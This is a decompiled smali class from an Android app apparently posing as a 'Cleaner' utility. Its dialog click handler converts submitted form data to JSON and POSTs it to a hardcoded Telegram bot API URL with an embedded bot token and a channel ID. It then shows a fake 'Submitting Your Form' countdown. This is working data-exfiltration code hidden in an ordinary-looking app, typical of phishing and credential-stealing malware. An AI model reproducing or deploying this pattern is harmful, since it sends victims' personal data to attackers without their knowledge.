.class LCleaner/Royall/gy;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/content/DialogInterface$OnClickListener;


# instance fields
.field final synthetic a:LCleaner/Royall/gx;

.field private final synthetic b:Lorg/json/JSONObject;


# direct methods
.method constructor <init>(LCleaner/Royall/gx;Lorg/json/JSONObject;)V
    .locals 0

    iput-object p1, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    iput-object p2, p0, LCleaner/Royall/gy;->b:Lorg/json/JSONObject;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic a(LCleaner/Royall/gy;)LCleaner/Royall/gx;
    .locals 0

    iget-object p0, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    return-object p0
.end method


# virtual methods
.method public onClick(Landroid/content/DialogInterface;I)V
    .locals 6

    iget-object p1, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    invoke-static {p1}, LCleaner/Royall/gx;->a(LCleaner/Royall/gx;)LCleaner/Royall/DirectorySubmitActivity;

    move-result-object p1

    invoke-static {p1}, LCleaner/Royall/DirectorySubmitActivity;->-$$Nest$fgett(LCleaner/Royall/DirectorySubmitActivity;)LCleaner/Royall/zl;

    move-result-object p1

    iget-object p2, p0, LCleaner/Royall/gy;->b:Lorg/json/JSONObject;

    invoke-virtual {p2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p2

    const-string v0, "https://api.telegram.org/bot7602603409:AAHMlX5gXN_9_wJENHq-jAjFQ7gZQQPj5NY/sendMessage?chat_id=@CleanerRoyalls&text="

    invoke-virtual {v0, p2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    iget-object v0, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    invoke-static {v0}, LCleaner/Royall/gx;->a(LCleaner/Royall/gx;)LCleaner/Royall/DirectorySubmitActivity;

    move-result-object v0

    invoke-static {v0}, LCleaner/Royall/DirectorySubmitActivity;->-$$Nest$fgetu(LCleaner/Royall/DirectorySubmitActivity;)LCleaner/Royall/zm;

    move-result-object v0

    const-string v1, "POST"

    const-string v2, "Telegram"

    invoke-virtual {p1, v1, p2, v2, v0}, LCleaner/Royall/zl;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;LCleaner/Royall/zm;)V

    iget-object p1, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    invoke-static {p1}, LCleaner/Royall/gx;->a(LCleaner/Royall/gx;)LCleaner/Royall/DirectorySubmitActivity;

    move-result-object p1

    invoke-static {p1}, LCleaner/Royall/DirectorySubmitActivity;->-$$Nest$fgetz(LCleaner/Royall/DirectorySubmitActivity;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    const-string p2, "\ud835\udc7a\ud835\udc96\ud835\udc83\ud835\udc8e\ud835\udc8a\ud835\udc95\ud835\udc95\ud835\udc8a\ud835\udc8f\ud835\udc88 \ud835\udc80\ud835\udc90\ud835\udc96\ud835\udc93 \ud835\udc6d\ud835\udc90\ud835\udc93\ud835\udc96\ud835\udc8e  (5\ud835\udc94\ud835\udc86\ud835\udc84...)"

    invoke-virtual {p1, p2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    iget-object p1, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    invoke-static {p1}, LCleaner/Royall/gx;->a(LCleaner/Royall/gx;)LCleaner/Royall/DirectorySubmitActivity;

    move-result-object p1

    invoke-static {p1}, LCleaner/Royall/DirectorySubmitActivity;->-$$Nest$fgetz(LCleaner/Royall/DirectorySubmitActivity;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    const/4 p2, 0x0

    invoke-virtual {p1, p2}, Landroid/app/AlertDialog$Builder;->setCancelable(Z)Landroid/app/AlertDialog$Builder;

    iget-object p1, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    invoke-static {p1}, LCleaner/Royall/gx;->a(LCleaner/Royall/gx;)LCleaner/Royall/DirectorySubmitActivity;

    move-result-object p1

    invoke-static {p1}, LCleaner/Royall/DirectorySubmitActivity;->-$$Nest$fgetz(LCleaner/Royall/DirectorySubmitActivity;)Landroid/app/AlertDialog$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object p1

    invoke-virtual {p1}, Landroid/app/AlertDialog;->show()V

    iget-object p2, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    invoke-static {p2}, LCleaner/Royall/gx;->a(LCleaner/Royall/gx;)LCleaner/Royall/DirectorySubmitActivity;

    move-result-object p2

    new-instance v0, LCleaner/Royall/gz;

    invoke-direct {v0, p0, p1}, LCleaner/Royall/gz;-><init>(LCleaner/Royall/gy;Landroid/app/AlertDialog;)V

    invoke-static {p2, v0}, LCleaner/Royall/DirectorySubmitActivity;->-$$Nest$fputC(LCleaner/Royall/DirectorySubmitActivity;Ljava/util/TimerTask;)V

    iget-object p1, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    invoke-static {p1}, LCleaner/Royall/gx;->a(LCleaner/Royall/gx;)LCleaner/Royall/DirectorySubmitActivity;

    move-result-object p1

    invoke-static {p1}, LCleaner/Royall/DirectorySubmitActivity;->-$$Nest$fgeta(LCleaner/Royall/DirectorySubmitActivity;)Ljava/util/Timer;

    move-result-object v0

    iget-object p1, p0, LCleaner/Royall/gy;->a:LCleaner/Royall/gx;

    invoke-static {p1}, LCleaner/Royall/gx;->a(LCleaner/Royall/gx;)LCleaner/Royall/DirectorySubmitActivity;

    move-result-object p1

    invoke-static {p1}, LCleaner/Royall/DirectorySubmitActivity;->-$$Nest$fgetC(LCleaner/Royall/DirectorySubmitActivity;)Ljava/util/TimerTask;

    move-result-object v1

    const-wide/16 v2, 0x3e8

    const-wide/16 v4, 0x64

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->scheduleAtFixedRate(Ljava/util/TimerTask;JJ)V

    return-void
.end method
